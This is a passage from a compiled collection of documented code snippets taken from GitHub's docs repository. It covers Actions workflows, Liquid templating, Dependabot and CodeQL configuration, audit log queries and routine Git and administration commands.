5.0.x\n      uses: {% data reusables.actions.action-setup-dotnet %}\n      with:\n        dotnet-version: '5.0.x'\n\n    - name: Install dependencies\n      run: nuget restore <sln_file_path>\n\n    - name: Build\n      run: msbuild <csproj_file_path> /t:PackageForAndroid /p:Configuration=Debug\n```\n\n----------------------------------------\n\nTITLE: Create Subversion Branch\nDESCRIPTION: This snippet demonstrates creating a new branch using `svn copy`. It copies the contents of the trunk to a new branch named `branches/more_awesome` and commits the change with a message. Requires an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ svn copy trunk branches/more_awesome\n> A    branches/more_awesome\n$ svn commit -m 'Added more_awesome topic branch'\n> Adding    branches/more_awesome\n\n> Committed revision 2.\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic: Handling GHES versions\nDESCRIPTION: This snippet uses conditional logic (`{% elsif ghes %}`) to handle cases where the documentation needs to be different for GitHub Enterprise Server (GHES) compared to other environments. The content within the `elsif ghes` block is rendered specifically for GHES deployments.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-peoples-access-to-your-organization-with-roles/roles-in-an-organization.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n{% elsif ghes %}\n<!-- GHES 3.3+ doesn't have the extra columns for Moderators and Billing managers. -->\n```\n\n----------------------------------------\n\nTITLE: Accessing YAML Variables\nDESCRIPTION: This snippet demonstrates how to access variables defined in YAML files using a templating syntax. It shows how nested variables are accessed using dot notation. The `data` object provides access to the variables.\nSOURCE: https://github.com/github/docs/blob/main/data/variables/README.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n{% data foo.bar.meaning_of_life %}\n\n{% data foo.bar.nested.values.too %}\n```\n\n----------------------------------------\n\nTITLE: Initialize Git Repository\nDESCRIPTION: Initializes a new Git repository in the current directory. This is a prerequisite for using subtree merges to manage multiple projects.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit init\n```\n\n----------------------------------------\n\nTITLE: Searching audit log based on date\nDESCRIPTION: Example search queries that filter events in the audit log based on the `created` qualifier. These queries demonstrate filtering events on a specific date, on or after a date, on or before a date, and within a date range.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/searching-the-audit-log-for-your-enterprise.md#_snippet_3\n\nLANGUAGE: Text\nCODE:\n```\ncreated:2014-07-08\n```\n\nLANGUAGE: Text\nCODE:\n```\ncreated:>=2014-07-08\n```\n\nLANGUAGE: Text\nCODE:\n```\ncreated:<=2014-07-08\n```\n\nLANGUAGE: Text\nCODE:\n```\ncreated:2014-07-01..2014-07-31\n```\n\n----------------------------------------\n\nTITLE: Axe Result Example: Message, FailureSummary, HTML, Impact - Shell\nDESCRIPTION: This snippet presents example results from the Axe test suite, emphasizing fields such as 'message' (specific troubleshooting information), 'failureSummary' (hints on how to fix the issue), 'html' (the problematic HTML code), and 'impact' (severity). This is used to pinpoint the exact location and nature of accessibility issues.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/axe.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n# Example 3\n\t+             \"message\": \"Element does not have text that is visible to screen readers\",\n    +         \"failureSummary\": \"Fix any of the following:\n    +   Element does not have text that is visible to screen readers\",\n    +         \"html\": \"<th scope=\\\"col\\\"></th>\",\n    +         \"impact\": \"minor\",\n\n# Example 4\n    +         \"failureSummary\": \"Fix all of the following:\n    +   List element has direct children that are not allowed: hr\",\n    +         \"html\": \"<ul class=\\\"List__ListBox-sc-1x7olzq-0 hgjakc\\\">\",\n    +         \"impact\": \"serious\"\n```\n\n----------------------------------------\n\nTITLE: Copying Example Backup Configuration\nDESCRIPTION: This command copies the example configuration file `backup.config-example` to `backup.config`. This provides a starting point for configuring the backup process.  The user must then edit `backup.config` to customize the settings.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncp backup.config-example backup.config\n```\n\n----------------------------------------\n\nTITLE: Expiring Content in HTML table syntax\nDESCRIPTION: This shows the correct syntax for adding an expiration date to a HTML table. Ensure the tag goes around the entire row, not just the cell.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_10\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- expires 2024-06-28 -->\n<tr>\n<td>\nmacOS\n</td>\n<td>\nThe <code>macos-11</code> label is {% data variables.release-phases.closing_down %} and will no longer be available after 28 June 2024.\n</td>\n</tr>\n<!-- end expires 2024-06-28 -->\n```\n\n----------------------------------------\n\nTITLE: Resolve Tests Command\nDESCRIPTION: The `codeql resolve tests` command expands command-line parameters to a list of .ql and .qlref files for execution as unit tests. It helps find QL unit tests within specified directories.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-tests.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve tests <options>... -- <test|dir>...\n```\n\n----------------------------------------\n\nTITLE: Allowing Specific Dependencies and Ignoring Others - YAML\nDESCRIPTION: This snippet shows how to use `allow` in conjunction with `ignore` to specify which dependencies Dependabot should maintain, while ignoring others.  It allows all direct and indirect dependencies for a Maven project but ignores dependencies matching the pattern `org.xwiki.*`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nregistries:\n  # Helps find updates for non Maven Central dependencies\n  maven-xwiki-public:\n    type: maven-repository\n    url: https://nexus.xwiki.org/nexus/content/groups/public/\n    username: \"\"\n    password: \"\"\n  # Required to resolve xwiki-common SNAPSHOT parent pom\n  maven-xwiki-snapshots:\n    type: maven-repository\n    url: https://maven.xwiki.org/snapshots\n    username: \"\"\n    password: \"\"\nupdates:\n  - package-ecosystem: \"maven\"\n    directory: \"/\"\n    registries:\n      - maven-xwiki-public\n      - maven-xwiki-snapshots\n    schedule:\n      interval: \"weekly\"\n    allow:\n      # Allow both direct and indirect updates for all packages.\n      - dependency-type: \"all\"\n    ignore:\n      # Ignore XWiki dependencies. We have a separate process for updating them\n      - dependency-name: \"org.xwiki.*\"\n    open-pull-requests-limit: 15\n```\n\n----------------------------------------\n\nTITLE: Liquid Tag Usage Example\nDESCRIPTION: This snippet demonstrates how to use a custom Liquid tag within a template.  Tags expect a single argument (usually a language agnostic href).\nSOURCE: https://github.com/github/docs/blob/main/src/content-render/README.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n{% data variables.product.product_name %}\n```\n\n----------------------------------------\n\nTITLE: Travis CI Syntax for Building with Node.js (YAML)\nDESCRIPTION: This YAML snippet shows how to configure a Node.js build in Travis CI, installing dependencies, running the build script, and executing tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\ninstall:\n  - npm install\nscript:\n  - npm run build\n  - npm test\n```\n\n----------------------------------------\n\nTITLE: Get Codespace Name from Environment Variable\nDESCRIPTION: Retrieves the permanent name of the current codespace using the `$CODESPACE_NAME` environment variable.  This command is executed within the codespace's terminal. It relies on the environment variable being set by the codespace environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/permanent-codespace-names.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\necho $CODESPACE_NAME\n```\n\n----------------------------------------\n\nTITLE: Tutorial Article Template YAML Frontmatter\nDESCRIPTION: This YAML snippet represents the frontmatter for a tutorial article. It defines metadata such as the title, short title, introduction, product, type, topics, and versions. This metadata is used to categorize and display the tutorial within the GitHub Docs platform.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/templates.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n{% raw %}---\ntitle: Tutorial title\nshortTitle: <subject> # Max 31 characters\nintro: 'Article intro. See tips for a great intro below'\nproduct: \"{{ optional product callout }}\"\ntype: tutorial\ntopics:\n  - <topic> # One or more from list of allowed topics: https://github.com/github/docs/blob/main/data/allowed-topics.js\nversions:\n  - <version>\n---\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Running Playwright Tests\nDESCRIPTION: This command runs Playwright tests for rendering. It starts a server on localhost:4000 and executes tests in tests/**/*.spec.ts files using Google Chrome.  The 'playwright-rendering' argument specifies the test suite to run.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- playwright-rendering\n```\n\n----------------------------------------\n\nTITLE: Configuring Maven registry in dependabot.yml\nDESCRIPTION: This snippet configures a Maven registry in the `dependabot.yml` file. It specifies the registry type, URL, username, and password using a secret.  The password should be stored as a GitHub secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  maven-artifactory:\n    type: maven-repository\n    url: https://acme.jfrog.io/artifactory/my-maven-registry\n    username: octocat\n    password: ${{secrets.MY_ARTIFACTORY_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Setting ACTIONS_RUNNER_CONTAINER_HOOKS environment variable - Bash\nDESCRIPTION: This bash script sets the `ACTIONS_RUNNER_CONTAINER_HOOKS` environment variable to the absolute path of the custom script (`/Users/octocat/runner/index.js`).  This variable tells the runner to execute the specified script before each container-based job. This snippet would typically be found in a `.env` file or set directly within the operating system's environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_7\n\nLANGUAGE: Bash\nCODE:\n```\nACTIONS_RUNNER_CONTAINER_HOOKS=/Users/octocat/runner/index.js\n```\n\n----------------------------------------\n\nTITLE: Querying hrMemorySize with SNMP v2c\nDESCRIPTION: This command queries the `hrMemorySize` using SNMP v2c. It requires the community string and hostname. The command returns the amount of RAM on the host.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/monitoring-using-snmp.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nsnmpget -v 2c -c COMMUNITY-STRING HOSTNAME HOST-RESOURCES-MIB::hrMemorySize.0\n```\n\n----------------------------------------\n\nTITLE: Defining S3 Bucket Permissions in AWS\nDESCRIPTION: This JSON code snippet defines the permissions required for an AWS access key and secret key to interact with an S3 bucket. It grants permissions to upload objects (s3:PutObject), retrieve objects (s3:GetObject), manage multipart uploads (s3:ListBucketMultipartUploads, s3:AbortMultipartUpload, s3:ListMultipartUploadParts), list bucket contents (s3:ListBucket), and delete objects (s3:DeleteObject) within the specified bucket.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/set-up-aws-bucket.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"VisualEditor0\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:PutObject\",\n                \"s3:GetObject\",\n                \"s3:ListBucketMultipartUploads\",\n                \"s3:AbortMultipartUpload\",\n                \"s3:ListBucket\",\n                \"s3:DeleteObject\",\n                \"s3:ListMultipartUploadParts\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::github-migration-bucket\",\n                \"arn:aws:s3:::github-migration-bucket/*\"\n            ]\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Resolving CodeQL Database\nDESCRIPTION: This command reports metadata about a specified database using the CodeQL CLI.  It requires the database as input and supports outputting the metadata in JSON format. The command is considered deep plumbing and is likely intended for internal use or advanced users.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-database.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve database <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Auditing a Bamboo instance\nDESCRIPTION: This snippet shows how to run an audit of a Bamboo instance using the `gh actions-importer audit bamboo` command. It generates a report summarizing the migration potential.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit bamboo --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Example JSON Response with Text Matches\nDESCRIPTION: This JSON snippet illustrates the format of a search result when requesting text match metadata. It includes the `text_matches` array, showing the object URL, type, property, fragment, and matches (including indices) for each search term found.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/search/search.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"text_matches\": [\n    {\n      \"object_url\": \"https://api.github.com/repositories/215335/issues/132\",\n      \"object_type\": \"Issue\",\n      \"property\": \"body\",\n      \"fragment\": \"comprehensive windows font I know of).\\n\\nIf we can find a commonly\n      distributed windows font that supports them then no problem (we can use html\n      font tags) but otherwise the '(21)' style is probably better.\\n\",\n      \"matches\": [\n        {\n          \"text\": \"windows\",\n          \"indices\": [\n            14,\n            21\n          ]\n        },\n        {\n          \"text\": \"windows\",\n          \"indices\": [\n            78,\n            85\n          ]\n        }\n      ]\n    },\n    {\n      \"object_url\": \"https://api.github.com/repositories/215335/issues/comments/25688\",\n      \"object_type\": \"IssueComment\",\n      \"property\": \"body\",\n      \"fragment\": \" right after that are a bit broken IMHO :). I suppose we could\n      have some hack that maxes out at whatever the font does...\\n\\nI'll check\n      what the state of play is on Windows.\\n\",\n      \"matches\": [\n        {\n          \"text\": \"Windows\",\n          \"indices\": [\n            163,\n            170\n          ]\n        }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Running ghe-cluster-repl-bootstrap utility - Shell\nDESCRIPTION: This shell command initiates the configuration of high availability for a GitHub Enterprise Server cluster using the `ghe-cluster-repl-bootstrap` utility. The `-p` and `-s` flags specify the primary and secondary datacenter names, respectively, allowing for customized datacenter naming. The utility guides the user through follow-up tasks to complete the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/configuring-high-availability-replication-for-a-cluster.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-repl-bootstrap -p PRIMARY-DATACENTER -s SECONDARY-DATACENTER\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering: FPT or GHES != 2.13, Liquid\nDESCRIPTION: This snippet uses the `ifversion` tag to conditionally render the text \"Alpha\" if either the FPT version is present or the GHES version is not equal to 2.13. It demonstrates combining version checks with a logical OR operator.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/not-equals.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes != 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Adding and committing encrypted secret file\nDESCRIPTION: These commands add the encrypted secret file to the git repository, commits the changes, and prepares it for pushing. Ensure to add the `.gpg` version, not the unencrypted file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_15\n\nLANGUAGE: shell\nCODE:\n```\ngit add my_secret.json.gpg\ngit commit -m \"Add new secret JSON file\"\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_SOURCE_BRANCH_SHA to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_SOURCE_BRANCH_SHA` to the GitHub Actions equivalent `${{ github.event.pull_request.head.sha}}`. Pull request head sha.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_66\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.head.sha}}\n```\n\n----------------------------------------\n\nTITLE: Running the compiled COBOL program\nDESCRIPTION: This command executes the compiled COBOL program named `accountsystem`. It assumes that the executable file is located in the current directory. This allows users to run the original COBOL application.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n./accountsystem\n```\n\n----------------------------------------\n\nTITLE: Adjusting the Height of the Migrations Table (Shell)\nDESCRIPTION: Adjusts the height of the migrations table displayed by `ghe-migrations` using the `-height` option.  Replace `LINES` with the desired number of lines.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_99\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrations -height LINES\n```\n\n----------------------------------------\n\nTITLE: Authenticating as Management Console user via HTTP with curl\nDESCRIPTION: Illustrates how to authenticate as a Management Console user to access the API using standard HTTP authentication with `curl`. Replace `YOUR_USER_NAME`, `YOUR_PASSWORD`, `HOSTNAME`, and `ADMIN-PORT` with the user's credentials and the server's address.  The username and password are sent in the HTTP Authorization header.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/management-console.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl -L -u \"YOUR_USER_NAME:YOUR_PASSWORD\" 'https://HOSTNAME:ADMIN-PORT/setup/api'\n```\n\n----------------------------------------\n\nTITLE: Example gh CLI Response\nDESCRIPTION: This is an example of a response received from the `gh` CLI when retrieving a list of GitHub issues. It showcases the HTTP status code and various headers providing information about the request.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\nHTTP/2.0 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Expose-Headers: ETag, Link, Location, Retry-After, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, X-GitHub-SSO, X-GitHub-Request-Id, Deprecation, Sunset\nCache-Control: private, max-age=60, s-maxage=60\nContent-Security-Policy: default-src 'none'\nContent-Type: application/json; charset=utf-8\nDate: Thu, 04 Aug 2022 19:56:41 GMT\nEtag: W/\"a63dfbcfdb73621e9d2e89551edcf9856731ced534bd7f1e114a5da1f5f73418\"\nLink: <https://api.github.com/repositories/1300192/issues?per_page=1&page=2>; rel=\"next\", <https://api.github.com/repositories/1300192/issues?per_page=1&page=14817>; rel=\"last\"\nReferrer-Policy: origin-when-cross-origin, strict-origin-when-cross-origin\nServer: GitHub.com\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\nVary: Accept, Authorization, Cookie, Accept-Encoding, Accept, X-Requested-With\nX-Accepted-Oauth-Scopes: repo\nX-Content-Type-Options: nosniff\nX-Frame-Options: deny\nX-Github-Api-Version-Selected: 2022-08-09\nX-Github-Media-Type: github.v3; format=json\nX-Github-Request-Id: 1C73:26D4:E2E500:1EF78F4:62EC2479\nX-Oauth-Client-Id: 178c6fc778ccc68e1d6a\nX-Oauth-Scopes: gist, read:org, repo, workflow\nX-Ratelimit-Limit: 15000\nX-Ratelimit-Remaining: 14996\nX-Ratelimit-Reset: 1659645499\nX-Ratelimit-Resource: core\nX-Ratelimit-Used: 4\nX-Xss-Protection: 0\n```\n\n----------------------------------------\n\nTITLE: HTTPS Image Tag in HTML\nDESCRIPTION: This HTML snippet demonstrates how to reference an image over HTTPS within an `<a>` tag. Updating the `href` of the anchor tag, as well as the `src` attribute of the `img` tag from `http://` to `https://` ensures the image is loaded securely and avoids mixed content warnings when HTTPS is enabled for the site. This snippet is crucial for ensuring all assets are served securely.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/securing-your-github-pages-site-with-https.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"https://www.somesite.com\"><img src=\"https://www.example.com/logo.jpg\" alt=\"Logo\"></a>\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering: NOT FPT and GHES != 2.13, Liquid\nDESCRIPTION: This snippet uses the `ifversion` tag with the `not` operator.  It renders \"Alpha\" if FPT is NOT present AND the GHES version is NOT equal to 2.13. This demonstrates using a logical AND with a negation and a version check.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/not-equals.md#_snippet_5\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes != 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Go Project with Custom Script\nDESCRIPTION: This snippet shows how to create a CodeQL database for a Go project using a custom build script.  It executes `./scripts/build.sh` and relies on the script to perform the necessary build steps.  It assumes the script exists and is executable, and that Go and CodeQL CLI are installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create go-database --language=go --command='./scripts/build.sh'\n```\n\n----------------------------------------\n\nTITLE: Removing Job Summaries - Bash\nDESCRIPTION: This code snippet shows how to delete a job summary file in a GitHub Actions workflow using bash. First, content is added to the `$GITHUB_STEP_SUMMARY` file. Then, the file is removed using the `rm` command. This effectively removes the summary for the current step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_50\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Delete all summary content\n  run: |\n    echo \"Adding Markdown content that we want to remove before the step ends\" >> $GITHUB_STEP_SUMMARY\n    rm $GITHUB_STEP_SUMMARY\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_ID` to the GitHub Actions equivalent `${{ github.event.pull_request.number }}`. MR id.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_57\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.number }}\n```\n\n----------------------------------------\n\nTITLE: Subject Folder Structure Example\nDESCRIPTION: This code snippet illustrates the typical structure of a subject folder within the `src/` directory. It includes common elements like documentation, libraries, middleware, pages, components, stylesheets, scripts, and tests. Not all elements are required for every subject folder.\nSOURCE: https://github.com/github/docs/blob/main/src/README.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nsrc/\n  xsubject/\n    README.md\n    docs/\n    lib/\n    middleware/\n    pages/\n    components/\n    stylesheets/\n    scripts/\n    tests/\n```\n\n----------------------------------------\n\nTITLE: Committing Changes to Git Repository\nDESCRIPTION: This snippet commits the staged changes to the local Git repository.  The `git commit -m \"First commit\"` command creates a new commit with the message \"First commit\".\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"First commit\"\n# Commits the tracked changes and prepares them to be pushed to a remote repository. {% data reusables.git.reset-head-to-previous-commit-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Adding Line Breaks in Markdown Files\nDESCRIPTION: Explains how to create line breaks in Markdown files, which require specific syntax compared to issues or pull requests. Options include using two spaces, a backslash, or an HTML single line break tag at the end of a line. It also demonstrates how blank lines create spacing between paragraphs.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_8\n\nLANGUAGE: markdown\nCODE:\n```\nThis example\\\nWill span two lines\n```\n\nLANGUAGE: markdown\nCODE:\n```\nThis example<br/>\nWill span two lines\n```\n\nLANGUAGE: markdown\nCODE:\n```\nThis example\n\nWill have a blank line separating both lines\n```\n\n----------------------------------------\n\nTITLE: Using Multiple Swift Versions\nDESCRIPTION: This workflow demonstrates how to use multiple Swift versions in a matrix configuration. It defines a matrix of operating systems (Ubuntu and macOS) and Swift versions (5.2 and 5.3). The `swift-actions/setup-swift` action is used to set up the specified Swift version for each matrix combination.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Swift\n\non: [push]\n\njobs:\n  build:\n    name: {% raw %}Swift ${{ matrix.swift }} on ${{ matrix.os }}{% endraw %}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n        swift: [\"5.2\", \"5.3\"]\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    steps:\n      - uses: swift-actions/setup-swift@65540b95f51493d65f5e59e97dcef9629ddf11bf\n        with:\n          swift-version: {% raw %}${{ matrix.swift }}{% endraw %}\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Build\n        run: swift build\n      - name: Run tests\n        run: swift test\n```\n\n----------------------------------------\n\nTITLE: Implementing Experiment Variation with Feature Flags\nDESCRIPTION: This TypeScript code snippet demonstrates how to use the `useShouldShowExperiment` hook to determine which version of a component to render based on the user's experiment variation (treatment or control). It imports necessary components and utilizes a conditional statement to display either the new search bar or the classic search bar based on the experiment outcome.\nSOURCE: https://github.com/github/docs/blob/main/src/events/components/experiments/README.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport { useShouldShowExperiment } from '@/events/components/experiments/useShouldShowExperiment'\nimport { EXPERIMENTS } from '@/events/components/experiments/experiments'\nimport { ClassicSearchBar } from \"@/search/components/ClassicSearchBar.tsx\"\nimport { NewSearchBar } from \"@/search/components/NewSearchBar.tsx\"\n\nexport function SearchBar() {\n  // Users who were randomly placed in the `treatment` group will be shown the experiment\n  const { shouldShow: shouldShowNewSearch } = useShouldShowExperiment(EXPERIMENTS.ai_search_experiment)\n\n  if (shouldShowNewSearch) {\n    return (\n      <NewSearchBar />\n    )\n  }\n  return <ClassicSearchBar />\n}\n```\n\n----------------------------------------\n\nTITLE: Looping through Deprecated Releases (New Format)\nDESCRIPTION: This snippet iterates through deprecated releases with the new format and creates a table row for each, including release date, deprecation date, support status (always 'Not supported'), release notes, and documentation links. Uses Liquid template language.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/all-releases.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- for version in enterpriseServerReleases.deprecatedReleasesWithNewFormat %}\n| {{version}} | {{enterpriseServerReleases.dates[version].releaseDate}} | {{enterpriseServerReleases.dates[version].deprecationDate}} | {% octicon \"x\" aria-label=\"Not supported\" %} | [{{version}} release notes](/enterprise-server@{{version}}/admin/release-notes) | [{{version}} documentation](/enterprise-server@{{version}}) |\n{%- endfor %}\n```\n\n----------------------------------------\n\nTITLE: Creating a Mermaid flow chart\nDESCRIPTION: This code snippet demonstrates how to create a simple flow chart using Mermaid syntax.  It defines nodes A, B, C, and D, and specifies the connections between them using arrows. The diagram is rendered based on this syntax.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-diagrams.md#_snippet_0\n\nLANGUAGE: Mermaid\nCODE:\n```\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker Daemon JSON\nDESCRIPTION: Updates the Docker daemon configuration to increase the default number of networks Docker can create. This is necessary when specifying more than 14 concurrent runners on a single virtual machine. It ensures that Docker can manage the required network resources for the runners.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/dependabot-runners-system-requirements.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"default-address-pools\": [\n    {\"base\":\"10.10.0.0/16\",\"size\":24}\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Copying SSH Public Key (Linux - Manual Copy)\nDESCRIPTION: Displays the content of the id_ed25519.pub file in the terminal on Linux. The user is then instructed to manually select and copy the displayed text to the clipboard.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/copy-ssh-public-key.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ cat ~/.ssh/id_ed25519.pub\n# Then select and copy the contents of the id_ed25519.pub file\n# displayed in the terminal to your clipboard\n```\n\n----------------------------------------\n\nTITLE: Setting Node Admin Action to 'approved' (nes set-node-adminaction approved)\nDESCRIPTION: This command allows {% data variables.product.prodname_nes %} to automatically take administrative action when a node with hostname HOSTNAME goes offline.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_57\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-adminaction approved HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Versioning for FPT and GHES >= 2.20 using YAML\nDESCRIPTION: This YAML snippet versions an article for Free, Pro, or Team (fpt) and GitHub Enterprise Server (ghes) versions 2.20 and above using '>='.\nSOURCE: 